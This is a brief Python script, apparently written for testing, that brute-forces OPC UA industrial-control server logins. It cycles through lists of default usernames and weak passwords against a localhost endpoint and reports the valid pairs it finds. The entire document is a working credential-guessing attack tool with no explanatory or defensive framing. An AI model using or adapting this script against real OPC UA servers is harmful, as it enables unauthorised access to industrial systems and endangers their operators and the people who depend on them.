from opcua import Client
import sys

endpoint = "opc.tcp://localhost:4840/freeopcua/server/"
users = ["root", "opc", "test", "admin"]
passwords = ["1234", "admin", "password", "opcua", "123456"]

for user in users:
    for pwd in passwords:
        client = Client(endpoint)
        client.set_user(user)
        client.set_password(pwd)
        try:
            client.connect()
            print(f"✅ Valid credentials found: {user}:{pwd}")
            client.disconnect()
            break
        except:
            print(f"❌ Failed with: {user}:{pwd}")